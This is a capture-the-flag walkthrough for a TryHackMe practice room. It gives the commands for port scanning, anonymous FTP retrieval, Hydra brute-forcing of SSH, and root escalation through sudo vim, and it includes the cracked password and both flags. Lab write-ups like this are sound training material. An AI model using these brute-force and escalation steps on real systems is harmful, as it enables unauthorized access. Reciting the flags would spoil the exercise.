Room: https://tryhackme.com/room/easyctf  

> sudo nmap -sV -sS -T5 -A -vv [roomIP]

After the scan is completed, we have the following open ports:  
* On port 21, FTP with Anonymous Login Allowed.
* On port 80, HTTP running on Apache 2.4.18.
* On port 2222, SSH.

Let's take a look at the FTP, since it allows anonymous login.  

> ftp [roomip] 21  

We have a directory called **pub** which holds a file called **ForMitch.txt**.  

> get ForMitch.txt  
> cat ForMitch.txt   

```
Dammit man... you'te the worst dev i've seen. You set the same pass for the system user,
and the password is so weak... i cracked it in seconds. Gosh... what a mess!
```

Now we have a possible username for the SSH service, which is mitch.  
We'll use Hydra to try and bruteforce the password.  

> sudo hydra -l mitch -P /usr/share/wordlists/rockyou.txt [roomip] ssh -s 2222 

```
[2222][ssh] host: xx.xx.xx.xxx   login: mitch   password: secret
```

> ssh mitch@[roomip] -p 2222

We can use python to spawn a bash shell  
> python3 -c 'import pty;pty.spawn("/bin/bash")'  

Inside the mitch's home directory we have our first flag.  **[1]**
```
G00d j0b, keep up!
```

The **sudo -l** command reveals us that we have access to **vim** as root.  

According to [GTFObins](https://gtfobins.github.io/gtfobins/vim/), we can escalate our privileges to root by using different methods. 

> sudo vim -c ':!/bin/sh'

```
# whoami
root
```

The second and final flag is located inside the /root/root.txt file. **[2]**
```
W3ll d0n3. You made it!
```

##  

**Note:** I ran a directory bruteforce while I was waiting for nnamp scan and we can access http://machineIP/simple. Maybe another way in? :) 
